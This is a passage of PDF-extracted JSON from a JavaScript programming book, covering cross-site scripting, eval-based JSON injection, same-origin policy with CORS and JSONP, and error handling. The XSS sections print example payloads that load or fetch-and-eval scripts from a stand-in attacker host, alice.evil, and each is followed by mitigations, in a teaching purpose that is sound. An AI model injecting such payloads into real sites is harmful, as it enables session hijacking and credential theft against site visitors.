        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Let's say Joe owns a website that allows you to log on, view puppy videos, and save them to your account. Whenever a user searches on that website, they are redirected to  https : //example.com/search?q=brown+puppies . If a user's search doesn't match anything, than they see a message along the lines of: Your search ( brown puppies ), didn't match anything. Try again. On the backend, that message is displayed like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if (! searchResults ){     webPage  +=   \"<div>Your search (<b>\"   +  searchQuery  +   \"</b>), didn't match anything. Try again.\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, when Alice searches for  <h1> headings </h1> , she gets this back: Your search ( headings ) didn't match anything. Try again. Raw HTML:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Your search  (< b >< h1 > headings </ h1 ></ b >)  didn 't match anything. Try again.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Than Alice searches for  <script> alert(1) </script> , she sees: Your search (), didn't match anything. Try again. And:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Than Alice searches for  <script  src =  \"https://alice.evil/puppy_xss.js></script>really cute puppies , and",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "copies the link in her address bar, and then emails Bob: Bob,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": [
            "output_directory\\image_437_1.png"
        ]
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 422",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "When I search for  cute puppies , nothing happens! Than Alice successfully gets Bob to run her script while Bob is logged on to his account.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mitigation:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Escape all angle brackets in searches before returning the search term when no results are found. 1. Don't return the search term when no results are found. 2.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Add a  Content Security Policy  that refuses to load active content from other domains 3.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.2: Persistent Cross-site scripting (XSS)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Let's say that Bob owns a social website that allows users to personalize their pro\ufb01les. Alice goes to Bob's website, creates an account, and goes to her pro\ufb01le settings. She sets her pro\ufb01le description to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "I 'm actually too lazy to write something here.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When her friends view her pro\ufb01le, this code gets run on the server:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if ( viewedPerson. profile . description ){     page  +=   \"<div>\"   +  viewedPerson. profile . description   +   \"</div>\" ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "} else {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    page  +=   \"<div>This person doesn't have a profile description.</div>\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Resulting in this HTML:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<div> I'm actually too lazy to write something here. </div>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Than Alice sets her pro\ufb01le description to  <b> I like HTML </b> . When she visits her pro\ufb01le, instead of seeing <b>I like HTML</b> she sees",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "I like HTML",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Then Alice sets her pro\ufb01le to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<script  src =  \"https://alice.evil/profile_xss.js\" ></script> I 'm actually too lazy to write something here.",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Whenever someone visits her pro\ufb01le, they get Alice's script run on Bob's website while logged on as their account.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mitigation",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Escape angle brackets in pro\ufb01le descriptions, etc. 1. Store pro\ufb01le descriptions in a plain text \ufb01le that is then fetched with a script that adds the description via 2.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". innerText",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "3.  Add a  Content Security Policy  that refuses to load active content from other domains",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 423",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.3: Persistent Cross-site scripting from JavaScript string literals",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Let's say that Bob owns a site that lets you post public messages. The messages are loaded by a script that looks like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "addMessage ( \"Message 1\" ); addMessage ( \"Message 2\" ); addMessage ( \"Message 3\" ); addMessage ( \"Message 4\" ); addMessage ( \"Message 5\" ); addMessage ( \"Message 6\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  addMessage  function adds a posted message to the DOM. However, in an e\ufb00ort to avoid XSS,  any HTML in",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "messages posted is escaped.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The script is generated  on the server  like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( var  i  =   0 ;  i  <  messages. length ;  i ++){     script  +=   \"addMessage( \\\" \"   +  messages [ i ]   +   \" \\\" );\" ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "So alice posts a message that says:  My mom said :   \"Life is good. Pie makes it better. \" . Than when she previews the message, instead of seeing her message she sees an error in the console:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Uncaught SyntaxError :  missing  )  after argument list",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Why? Because the generated script looks like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "addMessage ( \"My mom said: \" Life is good.  Pie  makes it better.  \"\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That's a syntax error. Than Alice posts:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "I like pie  \");fetch(\" https : //alice.evil/js_xss.js\").then(x=>x.text()).then(eval);//",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Then the generated script looks like:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "addMessage ( \"I like pie \" ); fetch ( \"https://alice.evil/js_xss.js\" ) . then ( x => x. text ()) . then ( eval ); //\");",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That adds the message  I like pie , but it also  downloads and runs  https : //alice.evil/js_xss.js  whenever",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "someone visits Bob's site. Mitigation:",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Pass the message posted into JSON.stringify() 1. Instead of dynamically building a script, build a plain text \ufb01le containing all the messages that is later fetched 2. by the script",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Add a  Content Security Policy  that refuses to load active content from other domains 3.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.4: Why scripts from other people can harm your website and its visitors",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "If you don't think that malicious scripts can harm your site,  you are wrong . Here is a list of what a malicious script",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 424",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "could do: Remove itself from the DOM so that  it can't be traced 1.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Steal users' session cookies and  enable the script author to log in as and impersonate them 2.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Show a fake \"Your session has expired. Please log in again.\" message that  sends the user's password to the 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "script author .",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Register a malicious service worker that runs a malicious script  on every page visit  to that website. 4. Put up a fake paywall demanding that users  pay money  to access the site  that actually goes to the script 5.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "author . Please,  don't think that XSS won't harm your website and its visitors.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 95.5: Evaled JSON injection",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Let's say that whenever someone visits a pro\ufb01le page in Bob's website, the following URL is fetched:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "https : //example.com/api/users/1234/profiledata.json",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With a response like this: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"name\" :   \"Bob\" ,      \"description\" :   \"Likes pie & security holes.\" }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Than that data is parsed & inserted:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  data  =  eval ( \"(\"   +  resp  +   \")\" ); document. getElementById ( \"#name\" ) . innerText   =  data. name ; document. getElementById ( \"#description\" ) . innerText   =  data. description ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Seems good, right?  Wrong.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "What if someone's description is  Likes XSS. \"});alert(1);({\" name \":\" Alice \",\" description \":\" Likes XSS. ?",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Seems weird, but if poorly done, the response will be: {",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"name\" :   \"Alice\" ,      \"description\" :   \"Likes pie & security holes.\" }); alert ( 1 );({ \"name\" : \"Alice\" , \"description\" : \"Likes XSS.\" }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And this will be  eval ed: ({",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     \"name\" :   \"Alice\" ,      \"description\" :   \"Likes pie & security holes.\" }); alert ( 1 );({ \"name\" : \"Alice\" , \"description\" : \"Likes XSS.\" })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you don't think that's a problem, paste that in your console and see what happens.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mitigation",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use JSON.parse instead of eval to get JSON.  In general, don't use eval, and de\ufb01nitely don't use eval with",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 425",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "something a user could control. Eval  creates a new execution context , creating a  performance hit . Properly escape  \"  and  \\  in user data before putting it in JSON. If you just escape the  \" , than this will happen:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hello !  \\ \"});alert(1);({",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will be converted to:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"Hello!  \\\\ \" }); alert ( 1 );({ \"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Oops. Remember to escape both the  \\  and  \" , or just use JSON.parse.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 426",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 96: Same Origin Policy & Cross- Origin Communication",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Same-Origin policy is used by web browsers to prevent scripts to be able to access remote content if the remote address has not the same  origin  of the script. This prevents malicious scripts from performing requests to other websites to obtain sensitive data. The  origin  of two addresses is considered the same if both URLs have the same  protocol ,  hostname  and  port .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 96.1: Safe cross-origin communication with messages",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  window. postMessage ()  method together with its relative event handler  window. onmessage  can be safely used to enable cross-origin communication. The  postMessage ()  method of the target  window  can be called to send a message to another  window , which will be able to intercept it with its  onmessage  event handler, elaborate it, and, if necessary, send a response back to the sender window using  postMessage ()  again.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Example of Window communicating with a children frame",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Content of  http : //main-site.com/index.html :   <!-- ... -->",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  <iframe   id = \"frame-id\"   src = \"http://other-site.com/index.html\" ></iframe>   <script   src = \"main_site_script.js\" ></script>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  <!-- ... --> Content of  http : //other-site.com/index.html :   <!-- ... -->",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  <script   src = \"other_site_script.js\" ></src>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  <!-- ... -->",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Content of  main_site_script. js :",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // Get the <iframe>'s window",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  var  frameWindow  =  document. getElementById ( 'frame-id' ) . contentWindow ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // Add a listener for a response",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": " window. addEventListener ( 'message' ,   function ( evt )   {      ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      // IMPORTANT: Check the origin of the data!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      if   ( event. origin . indexOf ( 'http://other-site.com' )   ==   0 )   {          ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "          // Check the response",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         console. log ( evt. data );           /* ... */       }   });         ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // Send a message to the frame's window",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": " frameWindow. postMessage ( /* any obj or var */ ,   '*' ); Content of  other_site_script. js :",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 427",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": " window. addEventListener ( 'message' ,   function ( evt )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      // IMPORTANT: Check the origin of the data!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "      if   ( event. origin . indexOf ( 'http://main-site.com' )   ==   0 )   {          ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "          // Read and elaborate the received data",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         console. log ( evt. data );           /* ... */",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "          // Send a response back to the main window",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         window. parent . postMessage ( /* any obj or var */ ,   '*' );       }   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 96.2: Ways to circumvent Same-Origin Policy",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "As far as client-side JavaScript engines are concerned (those running inside a browser), there is no straightforward solution available for requesting content from sources other than the current domain. (By the way, this limitation does not exist in JavaScript-server tools such as Node JS.) However, it is (in some situations) indeed possible to retrieve data from other sources using the following methods. Please do note that some of them may present hacks or workarounds instead of solutions production system should rely on.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Method 1: CORS",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Most public APIs today allow developers to send data bidirectionally between client and server by enabling a feature called CORS (Cross-Origin Resource Sharing). The browser will check if a certain HTTP header ( Access - Control - Allow - Origin ) is set and that the requesting site's domain is listed in the header's value. If it is, then the browser will allow establishing AJAX connections. However, because developers cannot change other servers' response headers, this method can't always be relied on.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Method 2: JSONP",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "JSON  with  P adding is commonly blamed to be a workaround. It is not the most straightforward method, but it still gets the job done. This method takes advantage of the fact that script \ufb01les can be loaded from any domain. Still, it is crucial to mention that requesting JavaScript code from external sources is  always  a potential security risk and this should generally be avoided if there's a better solution available. The data requested using JSONP is typically JSON, which happens to \ufb01t the syntax used for object de\ufb01nition in JavaScript, making this method of transport very simple. A common way to let websites use the external data obtained via JSONP is to wrap it inside a callback function, which is set via a  GET  parameter in the URL. Once the external script \ufb01le loads, the function will be called with the data as its \ufb01rst parameter.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "<script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function myfunc(obj){     console.log(obj.example_field); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "</script>",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "<script   src = \"http://example.com/api/endpoint.js?callback=myfunc\" ></script>",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The contents of  http : //example.com/api/endpoint.js?callback=myfunc  might look like this:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 428",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "myfunc ({ \"example_field\" : true })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The function always has to be de\ufb01ned \ufb01rst, otherwise it won't be de\ufb01ned when the external script loads.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 429",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 97: Error Handling",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 97.1: Error objects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Runtime errors in JavaScript are instances of the  Error  object. The  Error  object can also be used as-is, or as the base for user-de\ufb01ned exceptions. It's possible to throw any type of value - for example, strings - but you're strongly encouraged to use  Error  or one of its derivatives to ensure that debugging information -- such as stack traces -- is correctly preserved. The \ufb01rst parameter to the  Error  constructor is the human-readable error message. You should try to always specify a useful error message of what went wrong, even if additional information can be found elsewhere.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    throw   new  Error ( 'Useful message' ); }   catch   ( error )   {    console. log ( 'Something went wrong! '   +  error. message ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 97.2: Interaction with Promises",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Exceptions are to synchronous code what rejections are to promise-based asynchronous code. If an exception is thrown in a promise handler, its error will be automatically caught and used to reject the promise instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Promise. resolve ( 5 )     . then ( result  =>   {          throw   new  Error ( \"I don't like five\" );      })     . then ( result  =>   {         console. info ( \"Promise resolved: \"   +  result );      })     . catch ( error  =>   {         console. error ( \"Promise rejected: \"   +  error );      });   Promise rejected :  Error :  I don 't like five",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version > 7",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "The  async functions proposal \u2014 expected to be part of ECMAScript 2017 \u2014 extends this in the opposite direction. If you await a rejected promise, its error is raised as an exception:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "async  function  main ()   {    try   {     await Promise. reject ( new  Error ( \"Invalid something\" ));    }   catch   ( error )   {     console. log ( \"Caught error: \"   +  error );    } } main ();  ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 430",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Caught error :  Invalid something",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 97.3: Error types",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "There are six speci\ufb01c core error constructors in JavaScript: EvalError  - creates an instance representing an error that occurs regarding the global function  eval () . InternalError  - creates an instance representing an error that occurs when an internal error in the JavaScript engine is thrown. E.g. \"too much recursion\". (Supported only by  Mozilla Firefox ) RangeError  - creates an instance representing an error that occurs when a numeric variable or parameter is outside of its valid range. ReferenceError  - creates an instance representing an error that occurs when dereferencing an invalid reference. SyntaxError  - creates an instance representing a syntax error that occurs while parsing code in  eval () . TypeError  - creates an instance representing an error that occurs when a variable or parameter is not of a valid type. URIError  - creates an instance representing an error that occurs when  encodeURI ()  or  decodeURI ()  are passed invalid parameters. If you are implementing error handling mechanism you can check which kind of error you are catching from code.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     throw   new  TypeError (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "catch   ( e ){",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if ( e  instanceof  Error ){         console. log ( 'instance of general Error constructor' );      }      if ( e  instanceof  TypeError )   {         console. log ( 'type error' );      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In such case  e  will be an instance of  TypeError . All error types extend the base constructor  Error , therefore it's also an instance of  Error . Keeping that in mind shows us that checking  e  to be an instance of  Error  is useless in most cases.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 97.4: Order of operations plus advanced thoughts",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Without a try catch block, unde\ufb01ned functions will throw errors and stop execution:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefinedFunction ( \"This will not get executed\" ); console. log ( \"I will never run because of the uncaught error!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will throw an error and not run the second line:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Uncaught ReferenceError: undefinedFunction is not defined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You need a try catch block, similar to other languages, to ensure you catch that error so code can continue to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 431",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "execute:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    undefinedFunction ( \"This will not get executed\" ); }   catch ( error )   {     console. log ( \"An error occurred!\" ,  error );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}   finally   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"The code-block has finished\" ); } console. log ( \"I will run because we caught the error!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Now, we've caught the error and can be sure that our code is going to execute",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// An error occurred! ReferenceError: undefinedFunction is not defined( \u2026 ) // The code-block has finished // I will run because we caught the error!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "What if an error occurs in our catch block!?",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    undefinedFunction ( \"This will not get executed\" ); }   catch ( error )   {     otherUndefinedFunction ( \"Uh oh... \" );     console. log ( \"An error occurred!\" ,  error );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}   finally   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"The code-block has finished\" ); } console. log ( \"I won't run because of the uncaught error in the catch block!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We won't process the rest of our catch block, and execution will halt except for the \ufb01nally block.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// The code-block has finished // Uncaught ReferenceError: otherUndefinedFunction is not defined( \u2026 )",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You could always nest your try catch blocks.. but you shouldn't because that will get extremely messy..",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "try   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    undefinedFunction ( \"This will not get executed\" ); }   catch ( error )   {      try   {         otherUndefinedFunction ( \"Uh oh... \" );      }   catch ( error2 )   {         console. log ( \"Too much nesting is bad for my heart and soul...\" );      }     console. log ( \"An error occurred!\" ,  error );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}   finally   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( \"The code-block has finished\" ); } console. log ( \"I will run because we caught the error!\" );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Will catch all errors from the previous example and log the following:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Too much nesting is bad for my heart and soul... //An error occurred! ReferenceError: undefinedFunction is not defined( \u2026 ) //The code-block has finished //I will run because we caught the error!",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "So, how can we catch all errors!? For unde\ufb01ned variables and functions: you can't.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 432",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
